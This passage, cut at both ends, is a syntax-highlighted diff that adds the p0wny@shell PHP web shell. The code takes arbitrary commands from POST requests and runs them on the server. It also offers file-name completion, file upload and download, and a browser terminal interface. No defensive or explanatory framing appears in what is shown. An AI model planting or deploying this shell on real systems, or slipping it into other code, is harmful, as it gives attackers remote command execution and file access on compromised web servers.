+</span></span></span><span class="line"><span class="cl"><span class="s2">    </span><span class="si">$response</span><span class="s2"> = NULL;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    switch (</span><span class="si">$_GET[&#34;feature&#34;]</span><span class="s2">) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        case &#34;</span><span class="nx">shell</span><span class="s2">&#34;:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            </span><span class="si">$cmd</span><span class="s2"> = </span><span class="si">$_POST[&#39;cmd&#39;]</span><span class="s2">;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            if (!preg_match(&#39;/2&gt;/&#39;, </span><span class="si">$cmd</span><span class="s2">)) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                </span><span class="si">$cmd</span><span class="s2"> .= &#39; 2&gt;&amp;1&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">            </span><span class="si">$response</span><span class="s2"> = featureShell(</span><span class="si">$cmd</span><span class="s2">, </span><span class="si">$_POST[&#34;cwd&#34;]</span><span class="s2">);
+</span></span></span><span class="line"><span class="cl"><span class="s2">            break;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        case &#34;</span><span class="nx">pwd</span><span class="s2">&#34;:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            </span><span class="si">$response</span><span class="s2"> = featurePwd();
+</span></span></span><span class="line"><span class="cl"><span class="s2">            break;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        case &#34;</span><span class="nx">hint</span><span class="s2">&#34;:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            </span><span class="si">$response</span><span class="s2"> = featureHint(</span><span class="si">$_POST[&#39;filename&#39;]</span><span class="s2">, </span><span class="si">$_POST[&#39;cwd&#39;]</span><span class="s2">, </span><span class="si">$_POST[&#39;type&#39;]</span><span class="s2">);
+</span></span></span><span class="line"><span class="cl"><span class="s2">            break;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        case &#39;upload&#39;:
+</span></span></span><span class="line"><span class="cl"><span class="s2">            </span><span class="si">$response</span><span class="s2"> = featureUpload(</span><span class="si">$_POST[&#39;path&#39;]</span><span class="s2">, </span><span class="si">$_POST[&#39;file&#39;]</span><span class="s2">, </span><span class="si">$_POST[&#39;cwd&#39;]</span><span class="s2">);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    header(&#34;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">json</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    echo json_encode(</span><span class="si">$response</span><span class="s2">);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    die();
+</span></span></span><span class="line"><span class="cl"><span class="s2">} else {
+</span></span></span><span class="line"><span class="cl"><span class="s2">    initShellConfig();
+</span></span></span><span class="line"><span class="cl"><span class="s2">}
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">?&gt;&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;meta charset=&#34;</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">8</span><span class="s2">&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;meta name=&#34;</span><span class="nx">viewport</span><span class="s2">&#34; content=&#34;</span><span class="nx">width</span><span class="o">=</span><span class="nx">device</span><span class="o">-</span><span class="nx">width</span><span class="p">,</span> <span class="nx">initial</span><span class="o">-</span><span class="nx">scale</span><span class="o">=</span><span class="mf">1.0</span><span class="s2">&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;style&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            html, body {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                margin: 0;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                padding: 0;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                background: #333;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                color: #eee;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                font-family: monospace;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                width: 100vw;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                height: 100vh;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                overflow: hidden;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            *::-webkit-scrollbar-track {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                border-radius: 8px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                background-color: #353535;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            *::-webkit-scrollbar {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                width: 8px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                height: 8px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            *::-webkit-scrollbar-thumb {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                border-radius: 8px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                background-color: #bcbcbc;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            #shell {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                background: #222;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                font-size: 10pt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                display: flex;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                flex-direction: column;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                align-items: stretch;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                max-width: calc(100vw - 2 * var(--shell-margin));
+</span></span></span><span class="line"><span class="cl"><span class="s2">                max-height: calc(100vh - 2 * var(--shell-margin));
+</span></span></span><span class="line"><span class="cl"><span class="s2">                resize: both;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                overflow: hidden;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                width: 100%;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                height: 100%;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                margin: var(--shell-margin) auto;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            #shell-content {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                overflow: auto;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                padding: 5px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                white-space: pre-wrap;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                flex-grow: 1;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            #shell-logo {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                font-weight: bold;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                color: #FF4180;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                text-align: center;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            :root {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                --shell-margin: 25px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            @media (min-width: 1200px) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                :root {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    --shell-margin: 50px !important;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                }
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            @media (max-width: 991px),
+</span></span></span><span class="line"><span class="cl"><span class="s2">                   (max-height: 600px) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                #shell-logo {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    font-size: 6px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    margin: -25px 0;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                }
+</span></span></span><span class="line"><span class="cl"><span class="s2">                :root {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    --shell-margin: 0 !important;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                }
+</span></span></span><span class="line"><span class="cl"><span class="s2">                #shell {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    resize: none;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                }
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            @media (max-width: 767px) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                #shell-input {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    flex-direction: column;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                }
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            @media (max-width: 320px) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                #shell-logo {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    font-size: 5px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                }
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            .shell-prompt {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                font-weight: bold;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                color: #75DF0B;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            .shell-prompt &gt; span {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                color: #1BC9E7;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            #shell-input {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                display: flex;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                border-top: rgba(255, 255, 255, .05) solid 1px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                padding: 10px 0;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            #shell-input &gt; label {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                flex-grow: 0;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                display: block;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                padding: 0 5px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                height: 30px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                line-height: 30px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            #shell-input #shell-cmd {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                height: 30px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                line-height: 30px;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                border: none;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                background: transparent;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                color: #eee;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                font-family: monospace;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                font-size: 10pt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                width: 100%;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                align-self: center;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                box-sizing: border-box;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            #shell-input div {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                flex-grow: 1;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                align-items: stretch;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            #shell-input input {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                outline: none;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;/style&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            var SHELL_CONFIG = &lt;?php echo json_encode(</span><span class="si">$SHELL_CONFIG</span><span class="s2">); ?&gt;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            var CWD = null;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            var commandHistory = [];
+</span></span></span><span class="line"><span class="cl"><span class="s2">            var historyPosition = 0;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            var eShellCmdInput = null;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            var eShellContent = null;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            function _insertCommand(command) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                eShellContent.innerHTML += &#34;</span><span class="nx">\n\n</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                eShellContent.innerHTML += &#39;&lt;span class=</span><span class="se">\&#34;</span><span class="s2">shell-prompt</span><span class="se">\&#34;</span><span class="s2">&gt;&#39; + genPrompt(CWD) + &#39;&lt;/span&gt; &#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                eShellContent.innerHTML += escapeHtml(command);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                eShellContent.innerHTML += &#34;</span><span class="nx">\n</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                eShellContent.scrollTop = eShellContent.scrollHeight;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            function _insertStdout(stdout) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                eShellContent.innerHTML += escapeHtml(stdout);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                eShellContent.scrollTop = eShellContent.scrollHeight;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            function _defer(callback) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                setTimeout(callback, 0);
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            function featureShell(command) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">                _insertCommand(command);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                } else if (/^\s*clear\s*$/.test(command)) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    eShellContent.innerHTML = &#39;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                } else {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    makeRequest(&#34;</span><span class="o">?</span><span class="nx">feature</span><span class="o">=</span><span class="nx">shell</span><span class="s2">&#34;, {cmd: command, cwd: CWD}, function (response) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        if (response.hasOwnProperty(&#39;file&#39;)) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                            featureDownload(atob(response.name), response.file)
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        } else {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                            _insertStdout(atob(response.stdout));
+</span></span></span><span class="line"><span class="cl"><span class="s2">                            updateCwd(atob(response.cwd));
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        }
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    });
+</span></span></span><span class="line"><span class="cl"><span class="s2">                }
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            function featureHint() {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">                function _requestCallback(data) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    if (data.files.length &lt;= 1) return;  // no completion
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    data.files = data.files.map(function(file){
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        return atob(file);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    });
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    if (data.files.length === 2) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        if (type === &#39;cmd&#39;) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                            eShellCmdInput.value = data.files[0];
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        } else {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                            var currentValue = eShellCmdInput.value;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        }
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    } else {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        _insertCommand(eShellCmdInput.value);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        _insertStdout(data.files.join(&#34;</span><span class="nx">\n</span><span class="s2">&#34;));
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">                }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">                var currentCmd = eShellCmdInput.value.split(&#34;</span> <span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                var type = (currentCmd.length === 1) ? &#34;</span><span class="nx">cmd</span><span class="s2">&#34; : &#34;</span><span class="nx">file</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                var fileName = (type === &#34;</span><span class="nx">cmd</span><span class="s2">&#34;) ? currentCmd[0] : currentCmd[currentCmd.length - 1];
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">                makeRequest(
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &#34;</span><span class="o">?</span><span class="nx">feature</span><span class="o">=</span><span class="nx">hint</span><span class="s2">&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        filename: fileName,
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        cwd: CWD,
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        type: type
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    },
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    _requestCallback
+</span></span></span><span class="line"><span class="cl"><span class="s2">                );
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            function featureDownload(name, file) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                var element = document.createElement(&#39;a&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                element.setAttribute(&#39;href&#39;, &#39;data:application/octet-stream;base64,&#39; + file);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                element.setAttribute(&#39;download&#39;, name);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                element.style.display = &#39;none&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                document.body.appendChild(element);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                element.click();
+</span></span></span><span class="line"><span class="cl"><span class="s2">                document.body.removeChild(element);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                _insertStdout(&#39;Done.&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            function featureUpload(path) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                var element = document.createElement(&#39;input&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                element.setAttribute(&#39;type&#39;, &#39;file&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                element.style.display = &#39;none&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                document.body.appendChild(element);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                element.addEventListener(&#39;change&#39;, function () {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    var promise = getBase64(element.files[0]);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    promise.then(function (file) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        makeRequest(&#39;?feature=upload&#39;, {path: path, file: file, cwd: CWD}, function (response) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                            _insertStdout(atob(response.stdout));
+</span></span></span><span class="line"><span class="cl"><span class="s2">                            updateCwd(atob(response.cwd));
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        });
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    }, function () {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        _insertStdout(&#39;An unknown client-side error occurred.&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    });
+</span></span></span><span class="line"><span class="cl"><span class="s2">                });
+</span></span></span><span class="line"><span class="cl"><span class="s2">                element.click();
+</span></span></span><span class="line"><span class="cl"><span class="s2">                document.body.removeChild(element);
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            function getBase64(file, onLoadCallback) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                return new Promise(function(resolve, reject) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    var reader = new FileReader();
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    reader.onerror = reject;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    reader.readAsDataURL(file);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                });
+</span></span></span><span class="line"><span class="cl"><span class="s2">            }
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            function genPrompt(cwd) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                cwd = cwd || &#34;</span><span class="o">~</span><span class="s2">&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                var shortCwd = cwd;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                if (cwd.split(&#34;</span><span class="o">/</span><span class="s2">&#34;).length &gt; 3) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    var splittedCwd = cwd.split(&#34;</span><span class="o">/</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    shortCwd = &#34;</span><span class="nx">…</span><span class="o">/</span><span class="s2">&#34; + splittedCwd[splittedCwd.length-2] + &#34;</span><span class="o">/</span><span class="s2">&#34; + splittedCwd[splittedCwd.length-1];
+</span></span></span><span class="line"><span class="cl"><span class="s2">                }
+</span></span></span><span class="line"><span class="cl"><span class="s2">                return SHELL_CONFIG[&#34;</span><span class="nx">username</span><span class="s2">&#34;] + &#34;</span><span class="o">@</span><span class="s2">&#34; + SHELL_CONFIG[&#34;</span><span class="nx">hostname</span><span class="s2">&#34;] + &#34;</span><span class="o">:&lt;</span><span class="nx">span</span> <span class="nx">title</span><span class="o">=</span><span class="nx">\</span><span class="s2">&#34;&#34;</span> <span class="o">+</span> <span class="nx">cwd</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&gt;&#34;</span> <span class="o">+</span> <span class="nx">shortCwd</span> <span class="o">+</span> <span class="s2">&#34;&lt;/span&gt;#&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">function</span> <span class="nf">updateCwd</span><span class="p">(</span><span class="nx">cwd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">cwd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">CWD</span> <span class="o">=</span> <span class="nx">cwd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">_updatePrompt</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">makeRequest</span><span class="p">(</span><span class="s2">&#34;?feature=pwd&#34;</span><span class="p">,</span> <span class="p">{},</span> <span class="k">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">CWD</span> <span class="o">=</span> <span class="nx">atob</span><span class="p">(</span><span class="nx">response</span><span class="o">.</span><span class="nx">cwd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">_updatePrompt</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">function</span> <span class="nf">escapeHtml</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">string</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">.</span><span class="nx">replace</span><span class="p">(</span><span class="o">/&amp;/</span><span class="nx">g</span><span class="p">,</span> <span class="s2">&#34;&amp;amp;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">.</span><span class="nx">replace</span><span class="p">(</span><span class="o">/&lt;/</span><span class="nx">g</span><span class="p">,</span> <span class="s2">&#34;&amp;lt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">.</span><span class="nx">replace</span><span class="p">(</span><span class="o">/&gt;/</span><span class="nx">g</span><span class="p">,</span> <span class="s2">&#34;&amp;gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">function</span> <span class="nf">_updatePrompt</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">var</span> <span class="nx">eShellPrompt</span> <span class="o">=</span> <span class="nx">document</span><span class="o">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;shell-prompt&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">eShellPrompt</span><span class="o">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">genPrompt</span><span class="p">(</span><span class="nx">CWD</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
